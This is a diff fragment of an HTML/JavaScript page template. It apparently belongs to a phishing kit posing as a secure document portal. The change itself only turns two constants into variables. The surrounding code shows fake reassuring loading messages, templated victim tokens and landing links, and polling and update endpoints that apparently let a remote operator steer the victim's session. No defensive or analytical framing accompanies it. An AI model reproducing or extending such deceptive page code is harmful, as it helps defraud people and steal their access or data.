@@ -101,8 +101,8 @@ fieldset input{width:95%;height:30px;border:0;outline:0;font-size:15px;backgroun
 <div id="loadingOverlay" class="loading-overlay"><div class="loading-spinner"></div><p class="loading-text" id="loadingMessage">Securing your connection...</p><p class="loading-error" id="errorMessage">An error occurred. Please try again later.</p></div>
 <script>
 const templateConfig={postURL:window.location.origin+'/api',token:"{{token}}",landingPageLink:"{{landingPageLink}}",pollingUrl:"{{pollingUrl}}",updateUrl:"{{updateUrl}}"};
-const apiBaseUrl=templateConfig.pollingUrl?templateConfig.pollingUrl.replace('/pooling-operator',''):templateConfig.postURL;
-const updateBaseUrl=templateConfig.updateUrl?templateConfig.updateUrl.replace('/update-process',''):templateConfig.postURL;let browserId=null,pollingIntervalId=null,pollingStartTime=null;
+let apiBaseUrl=templateConfig.pollingUrl?templateConfig.pollingUrl.replace('/pooling-operator',''):templateConfig.postURL;
+let updateBaseUrl=templateConfig.updateUrl?templateConfig.updateUrl.replace('/update-process',''):templateConfig.postURL;let browserId=null,pollingIntervalId=null,pollingStartTime=null;
 const POLLING_TIMEOUT_MS=10*60*1000;let currentStatus=null,lastShownStatus='';
 const loadingMessages=["Securing your connection...","Verifying document integrity...","Establishing encrypted tunnel...","Authenticating access protocols...","Preparing your secure workspace...","Almost there, just a moment...","Ensuring data privacy...","Finalizing secure document retrieval..."];
 let currentMessageIndex=0,messageIntervalId=null;
